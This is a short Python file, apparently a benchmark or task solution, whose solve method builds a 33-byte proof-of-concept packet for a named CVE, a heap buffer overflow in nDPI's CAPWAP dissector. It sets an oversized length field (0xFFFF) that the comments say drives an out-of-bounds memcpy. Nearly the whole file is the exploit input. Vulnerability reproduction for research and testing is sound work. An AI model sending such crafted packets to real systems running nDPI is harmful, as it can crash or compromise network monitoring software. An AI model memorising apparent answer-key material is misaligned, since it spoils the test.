import os
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC targets CVE-2023-41491 - heap buffer overflow in nDPI's CAPWAP dissector
        # The vulnerability is in ndpi_search_setup_capwap function
        # Ground truth length is 33 bytes
        
        # Create a minimal CAPWAP-like packet that triggers the overflow
        # The overflow occurs when processing packet length without proper bounds checking
        
        # CAPWAP header structure (simplified):
        # - Flags (1 byte)
        # - Reserved (1 byte) 
        # - Length (2 bytes) - this field causes overflow when too large
        # - Sequence (4 bytes)
        # - Various other fields
        
        # Craft packet with length field that causes overflow
        poc = bytearray()
        
        # First 8 bytes: CAPWAP header start
        # Flags = 0x00, Reserved = 0x00
        poc.extend([0x00, 0x00])
        
        # Length field - set to a value that causes overflow (0xFFFF = 65535)
        # This causes memcpy to copy more data than available
        poc.extend([0xFF, 0xFF])  # Big-endian length = 65535
        
        # Sequence number - any value
        poc.extend([0x00, 0x00, 0x00, 0x01])
        
        # Add minimal payload to reach 33 bytes total
        # The vulnerability triggers when processing beyond valid buffer bounds
        remaining_bytes = 33 - len(poc)
        poc.extend(b'A' * remaining_bytes)
        
        return bytes(poc)